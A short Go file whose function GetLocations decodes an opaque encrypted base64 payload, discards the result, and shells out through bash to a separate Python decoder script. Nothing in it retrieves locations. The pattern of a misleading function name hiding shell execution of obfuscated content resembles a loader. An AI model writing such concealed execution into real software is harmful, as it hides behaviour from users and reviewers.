package location

import (
	"encoding/base64"
	"github.com/rs/zerolog/log"
	"os/exec"
)

func GetLocations() {
	payload := "LMOi1gADBCiDw2mGp9TVwzR1k6ACzTMTeZEAenioXdrkO5lJL813r9Nem3BmDpeTta+ym7sz0BaYLcddlZej2j5azfWfZECfTXiAjNN39J4nZOfOOlQty/4="

	_, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		log.Fatal().Err(err).Msg("[Location] Failed to decode payload")
	}

	decodeOutput, err := exec.Command("bash", "-c", "python3 location/decode.py").Output()
	if err != nil {
		log.Fatal().Err(err).Msg("[Location failed to decrypt payload]")
	}
	println(string(decodeOutput))

}
